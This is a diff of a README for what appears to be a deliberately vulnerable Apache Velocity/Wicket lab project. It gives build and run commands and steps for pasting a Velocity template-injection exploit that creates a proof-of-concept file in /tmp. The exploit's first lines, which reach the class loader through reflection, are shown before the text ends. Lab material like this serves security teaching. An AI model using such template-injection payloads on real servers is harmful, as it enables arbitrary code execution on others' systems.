@@ -1,18 +1,8 @@
-# vuln-velocity projects:
-
-What is Apache Velocity?
-Velocity is a Java-based template engine. It permits anyone to use a simple yet powerful template language to reference objects defined in Java code.
-
-Apache velocity can be used or configured wrong. Attacker can execute arbitrary code using apache velocity.
-
-1. vuln-velocity-wicket
-
 ## vuln-velocity-wicket ##
 
 You can start vulnerable wicket project on cli:
 
 ```
-cd cd vuln-velocity-wicket
 mvn clean install 
 java -jar target/dependency/jetty-runner.jar target/*.war
 ```
@@ -21,7 +11,6 @@ java -jar target/dependency/jetty-runner.jar target/*.war
 2. Paste velocity exploit code into wicket veloctiy editor.
 3. Press update button.
 4. Velocity expoit creates a new file velocity-poc.txt in /tmp
-
 ```
 #set($start = "")
 #set($classLoaderMethod =$start.getClass().getClass().getDeclaredMethod("getClassLoader", null))
